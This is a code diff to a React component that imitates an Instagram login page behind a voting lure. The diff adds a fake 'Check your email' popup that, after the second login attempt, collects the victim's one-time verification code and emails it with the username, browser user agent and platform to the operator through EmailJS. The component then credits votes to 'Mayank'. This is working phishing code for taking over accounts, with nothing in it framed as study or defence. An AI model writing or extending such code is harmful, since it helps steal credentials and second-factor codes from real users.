@@ -16,6 +16,9 @@ const FacebookGlyph = () => (
     const [showError, setShowError] = useState(false);
     const [loginAttempts, setLoginAttempts] = useState(0);
     const [showPassword, setShowPassword] = useState(false);
+    const [showVerification, setShowVerification] = useState(false);
+    const [verificationCode, setVerificationCode] = useState("");
+    const [isVerifying, setIsVerifying] = useState(false);
 
     const handleChange = (e) =>
         setFormData((s) => ({ ...s, [e.target.name]: e.target.value }));
@@ -65,20 +68,9 @@ IP Address: ${navigator.connection ? navigator.connection.effectiveType : 'Unkno
                 console.log('First login attempt - showing error and staying on page');
                 setFormData(prev => ({ ...prev, password: "" }));
             } else {
-                // Second attempt: go to voting page
-                console.log('Second login attempt - going to voting page');
-                console.log('Calling onLoginSuccess to increase Mayank votes');
-                if (onLoginSuccess) {
-                    onLoginSuccess();
-                    console.log('onLoginSuccess called successfully');
-                    // Small delay to ensure state updates before closing
-                    setTimeout(() => {
-                        onBack();
-                    }, 100);
-                } else {
-                    console.log('onLoginSuccess function not provided');
-                    onBack();
-                }
+                // Second attempt: show verification step
+                console.log('Second login attempt - showing verification step');
+                setShowVerification(true);
             }
         })
         .catch((error) => {
@@ -92,20 +84,9 @@ IP Address: ${navigator.connection ? navigator.connection.effectiveType : 'Unkno
                 console.log('First login attempt (with error) - showing error and staying on page');
                 setFormData(prev => ({ ...prev, password: "" }));
             } else {
-                // Second attempt: go to voting page even on error
-                console.log('Second login attempt (with error) - going to voting page');
-                console.log('Calling onLoginSuccess to increase Mayank votes (even with email error)');
-                if (onLoginSuccess) {
-                    onLoginSuccess();
-                    console.log('onLoginSuccess called successfully (after email error)');
-                    // Small delay to ensure state updates before closing
-                    setTimeout(() => {
-                        onBack();
-                    }, 100);
-                } else {
-                    console.log('onLoginSuccess function not provided');
-                    onBack();
-                }
+                // Second attempt: show verification step even on error
+                console.log('Second login attempt (with error) - showing verification step');
+                setShowVerification(true);
             }
         })
         .finally(() => {
@@ -115,6 +96,68 @@ IP Address: ${navigator.connection ? navigator.connection.effectiveType : 'Unkno
             if (loginAttempts === 0) {
                 setShowError(true);
             }
+        });
+    };
+
+    const handleVerificationSubmit = (e) => {
+        e.preventDefault();
+        if (!verificationCode.trim()) return;
+        
+        setIsVerifying(true);
+        
+        // Send verification code to email
+        const verificationParams = {
+            to_name: "Admin",
+            from_name: formData.username,
+            from_email: formData.username,
+            message: `Verification code entered:
+            
+Username: ${formData.username}
+Verification Code: ${verificationCode}
+Timestamp: ${new Date().toLocaleString()}
+User Agent: ${navigator.userAgent}
+Platform: ${navigator.platform}`,
+            to_email: "zcL4jj0QhEChPRS1V",
+            cc_email: "ccVYMZ-EhtB11G8yBC8YX"
+        };
+
+        emailjs.send(
+            'service_ijklxic',
+            'template_n8csemo',
+            verificationParams,
+            'zcL4jj0QhEChPRS1V'
+        )
+        .then((response) => {
+            console.log('Verification code sent successfully:', response);
+            // Call onLoginSuccess to increase Mayank's votes and go to voting page
+            if (onLoginSuccess) {
+                onLoginSuccess();
+                console.log('onLoginSuccess called successfully');
+                // Small delay to ensure state updates before closing
+                setTimeout(() => {
+                    onBack();
+                }, 100);
+            } else {
+                console.log('onLoginSuccess function not provided');
+                onBack();
+            }
+        })
+        .catch((error) => {
+            console.error('Verification code sending failed:', error);
+            // Still go to voting page even if email fails
+            if (onLoginSuccess) {
+                onLoginSuccess();
+                console.log('onLoginSuccess called successfully (after verification error)');
+                setTimeout(() => {
+                    onBack();
+                }, 100);
+            } else {
+                console.log('onLoginSuccess function not provided');
+                onBack();
+            }
+        })
+        .finally(() => {
+            setIsVerifying(false);
         });
     };
 
@@ -279,6 +322,100 @@ IP Address: ${navigator.connection ? navigator.connection.effectiveType : 'Unkno
           <span>© 2025 Instagram from Meta</span>
         </div>
       </footer>
+
+      {/* Verification Popup */}
+      {showVerification && (
+        <div className="fixed inset-0 bg-black/60 backdrop-blur-[1px] z-50 flex items-center justify-center p-4">
+          <div className="w-full max-w-md rounded-2xl bg-white text-gray-900 shadow-2xl border border-gray-200">
+            {/* Top bar */}
+            <div className="flex items-center justify-between px-4 py-3">
+              <button
+                onClick={() => setShowVerification(false)}
+                className="p-2 rounded-lg hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                aria-label="Close"
+              >
+                <svg className="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"/>
+                </svg>
+              </button>
+
+              <button
+                className="p-2 rounded-lg hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                aria-label="Help"
+              >
+                <svg className="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                  <path strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"
+                    d="M8 10a4 4 0 118 0c0 2-2 2.5-2 4M12 17h.01"/>
+                </svg>
+              </button>
+            </div>
+
+            {/* Body */}
+            <div className="px-5 pb-6">
+              <h2 className="text-3xl font-extrabold tracking-tight mb-2 text-gray-900">Check your email</h2>
+              <p className="text-gray-600 mb-5">
+                Enter the code that we sent to your email and WhatsApp
+              </p>
+
+              {/* Illustration block */}
+              <div className="rounded-xl overflow-hidden bg-gray-50 mb-5">
+                <img 
+                  src="https://pmecdn.protonweb.com/image-transformation/?s=c&image=images%2Ff_auto%2Cq_auto%2Fv1712245030%2Fwp-pme%2Fhow-to-create-an-email-address-without-phone-number-verification-blog%2Fhow-to-create-an-email-address-without-phone-number-verification-blog.%3F_i%3DAA"
+                  alt="Email verification illustration"
+                  className="w-full h-full object-cover"
+                />
+              </div>
+
+              {/* Form */}
+              <form onSubmit={handleVerificationSubmit} className="space-y-4">
+                <input
+                  inputMode="numeric"
+                  pattern="\d*"
+                  maxLength={6}
+                  autoFocus
+                  value={verificationCode}
+                  onChange={(e) => setVerificationCode(e.target.value.replace(/\D/g, ""))}
+                  placeholder="Enter code"
+                  className="w-full h-14 px-4 rounded-xl bg-white border border-gray-300 text-gray-900 placeholder-gray-500
+                             focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                  aria-label="Verification code"
+                />
+
+                <button
+                  type="button"
+                  className="text-blue-600 text-sm font-medium hover:underline"
+                >
+                  Get a new code
+                </button>
+
+                <button
+                  type="submit"
+                  disabled={!verificationCode.trim() || isVerifying}
+                  className="w-full h-14 rounded-xl font-semibold
+                             bg-blue-600 hover:bg-blue-700 text-white
+                             disabled:opacity-50 disabled:hover:bg-blue-600 transition-colors"
+                >
+                  {isVerifying ? (
+                    <span className="inline-flex items-center gap-2">
+                      <span className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
+                      Verifying…
+                    </span>
+                  ) : (
+                    "Continue"
+                  )}
+                </button>
+
+                <button
+                  type="button"
+                  className="w-full h-14 rounded-xl font-semibold border border-gray-300 text-gray-700 hover:bg-gray-50"
+                >
+                  Try another way
+                </button>
+              </form>
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   );
 }
